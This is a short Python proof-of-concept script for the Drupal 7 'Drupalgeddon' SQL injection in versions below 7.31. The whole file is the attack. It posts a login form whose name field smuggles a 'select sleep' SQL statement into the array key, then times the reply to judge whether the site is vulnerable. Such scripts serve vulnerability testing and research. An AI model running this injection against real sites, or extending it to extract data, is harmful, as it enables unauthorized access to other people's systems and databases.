import requests, time

# PoC
# drupal < 7.31 url
# SQL injection in form login
# http://www.kalose.net/oss/drupal-7-drupalgeddon-exploit/#comment-17370

# configure the url to test
url = "http://localhost:88/"

path = url+"?q=node&destination=no"
headers = {"Content-Type": "application/x-www-form-urlencoded"}
# delay of sleep in sql injection
sleep = 5
proxies = {}

# payload
# name[0; select sleep(10); -- -]=name1&name[0]=name2&pass=pass&form_build_id=form-4NYoP0XFPcKisrZja0Lov3-9_9uwYjtdBZnuvBboaNM&form_id=user_login_block&op=Log in
payload="name%5B0%3B+select+sleep%28"+str(sleep)+"%29%3B+--+-%5D=name1&name%5B0%5D=name2&pass=pass&form_build_id=xxx&form_id=user_login_block&op=Log+in"
start = time.time()
r = requests.post(path, headers=headers, proxies=proxies, data=payload)
end = time.time()

delta = end - start

if delta > sleep:
	print "seems to be vuln"
	print ("delta %s")%(delta)

else:
	print "seems to not be vuln"
